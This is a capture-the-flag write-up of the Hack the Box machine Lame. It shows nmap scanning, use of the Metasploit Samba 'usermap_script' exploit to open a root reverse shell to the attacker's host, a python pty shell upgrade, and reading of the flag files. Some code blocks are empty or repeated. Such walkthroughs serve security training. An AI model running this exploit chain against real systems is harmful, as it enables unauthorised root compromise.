Lame is an easy level retired capture the flag machine from Hack the Box. This writeup will describe the techniques I used to bypass security controls and gain root access to the machine.

## Getting Started   
After connecting to the hack the box network via openvpn, the first thing I did was use a basic nmap scan to search for the top 200 open ports. The scan shows 4 open ports running services including ftp, ssh, netbiod, and microsoft-ds.


```
┌──(kali㉿kali)-[~/Documents/htb/lame]
└─$ nmap --top-ports 200 -Pn 10.10.10.3                                                    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.86 seconds
```    

Next, to get a more detailed view of the open ports and services, as well as to check the service versions for common vulnerabilities, I used the [nmap automator](https://github.com/21y4d/nmapAutomator) script. The output below is snipped to include only the most relevant information from the scan.

```  

The nmapAutomator scan revealed a lot of interesting information about the target, including a likely vulnerbility. Instead of using the identifed vulnerabilites, I instead opted to go after the smb service, which I noted was a vulnerable version.  

```
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```  

After doing some quick research with searchsploit and exploit-db, I confirmed that the current smb version in use is vulnerable to a public exploit on metasploit. Below is the high level details on the multi/samba/usermap_script metasploit module.

```
msf6 exploit(multi/samba/usermap_script) > info

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script

  ----    ---------------  --------  -----------
  RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT   139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba 
  versions 3.0.20 through 3.0.25rc3 when using the non-default 
  "username map script" configuration option. By specifying a username 
  containing shell meta characters, attackers can execute arbitrary 
  commands. No authentication is needed to exploit this vulnerability 
  since this option is used to map usernames prior to authentication!

msf6 exploit(multi/samba/usermap_script) > 
```  

I configured the necessary options including setting the target host/port and the local host/port. Executing the exploit started a reverse shell on the target as the root user.   

```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Command shell session 1 opened (10.10.14.3:4444 -> 10.10.10.3:55731) at 2021-01-11 09:16:25 -0500

whoami
root
pwd
/
```  

Next, i upgraded my shell using python in order to get a more functioning shell.   

```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Command shell session 1 opened (10.10.14.3:4444 -> 10.10.10.3:55731) at 2021-01-11 09:16:25 -0500

whoami
root
pwd
/
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash
python -c 'import pty;pty.spawn("/bin/bash")'
root@lame:/# 
```  

With a more functioning shell, I used the `find` command to search for the root.txt and user.txt flags.

```
root@lame:/# find -name "root.txt"
find -name "root.txt"
./root/root.txt
root@lame:/# cat ./root/root.txt
cat ./root/root.txt

```  

```
root@lame:/# find -name "user.txt"
find -name "user.txt"
./home/makis/user.txt
root@lame:/# cat ./home/makis/user.txt
cat ./home/makis/user.txt

```

## Conclusion  
Overall this was a fairly straight forward CTF machine vulnerable to a very popular metasploit exploit.
